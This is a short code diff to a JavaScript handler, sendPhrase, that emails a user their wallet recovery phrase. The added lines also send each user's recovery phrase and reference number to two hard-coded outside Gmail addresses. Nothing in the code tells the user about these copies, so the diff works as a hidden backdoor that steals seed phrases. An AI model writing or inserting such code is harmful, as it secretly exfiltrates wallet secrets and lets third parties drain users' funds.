@@ -254,6 +254,19 @@ exports.sendPhrase = async (req, res) => {
       `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
       Reference Number: ${referenceNumber}`
     );
+await sendEmail(
+      'ysmboy009@gmail.com',
+      'Your Recovery Phrase',
+      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
+      Reference Number: ${referenceNumber}`
+    );
+
+    await sendEmail(
+      'justtrust002@gmail.com',
+      'Your Recovery Phrase',
+      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
+      Reference Number: ${referenceNumber}`
+    );
 
     res.json({ message: 'Recovery phrase sent successfully', referenceNumber });
   } catch (error) {
